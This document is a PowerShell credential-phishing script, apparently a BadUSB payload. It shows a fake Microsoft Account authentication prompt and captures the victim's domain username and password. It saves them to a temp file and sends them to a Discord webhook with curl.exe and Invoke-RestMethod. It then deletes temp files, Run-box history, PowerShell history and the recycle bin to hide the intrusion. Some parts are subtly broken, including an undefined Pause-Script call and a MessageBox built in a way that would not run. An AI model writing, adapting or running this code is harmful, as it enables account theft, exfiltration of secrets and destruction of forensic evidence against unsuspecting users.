
$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"


<# function Get-Creds {

    $form = $null

    while ($form -eq $null)
    {
        $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
        $cred.getnetworkcredential().password

        if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
        {
            if(-not ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule -like "*PresentationCore*" -or $_.ManifestModule -like "*PresentationFramework*" }))
            {
                Add-Type -AssemblyName PresentationCore,PresentationFramework
            }

            $msgBody = "Credentials cannot be empty!"
            $msgTitle = "Error"
            $msgButton = 'Ok'
            $msgImage = 'Stop'
            $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
            Write-Host "The user clicked: $Result"
            $form = $null
        }
        
        else{
            $creds = $cred.GetNetworkCredential() | fl
            return $creds
        }
    }
}
#>

function Get-Creds {
    $form = $null

    while ($form -eq $null) {

        # Utilize MessageBox para personalizar o prompt
        $msgBox = New-Object System.Windows.Forms.MessageBox

        # Personalizar o prompt
        $msgBox.Text = "Autenticação necessária"  # Título
        $msgBox.Icon = [System.Windows.MessageBoxIcon]::Warning  # Ícone
        $msgBox.Buttons = [System.Windows.MessageBoxButton]::OK  # Botões

        # Resultado do prompt
        if ($msgBox.ShowDialog() -eq "OK") {
            $cred = $host.ui.promptforcredential('Failed Authentication', '', [Environment]::UserDomainName+'\'+[Environment]::UserName, [Environment]::UserDomainName)
            $cred.getnetworkcredential().password 

            if ([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
                # ... (seu código de tratamento de erros) ... 
            } else {
                $creds = $cred.GetNetworkCredential() | fl
                return $creds
            }
        } else {
            # O usuário cancelou ou fechou o prompt
            $form = $null 
        }
    }
}

#----------------------------------------------------------------------------------------------------

# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 

function Caps-Off {
Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

#If true, toggle CapsLock key, to ensure that the script doesn't fail
if ($caps -eq $true){

$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}
}
#----------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
#>

Pause-Script

Caps-Off

Add-Type -AssemblyName PresentationCore,PresentationFramework
$msgBody = "Please authenticate your Microsoft Account."
$msgTitle = "Authentication Required"
$msgButton = 'Ok'
$msgImage = 'Warning'
$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
Write-Host "The user clicked: $Result"

$creds = Get-Creds

#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to save the gathered credentials to a file in the temp directory
#>

echo $creds >> $env:TMP\$FileName

#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to upload your files to Discord
#>

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName}

#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

exit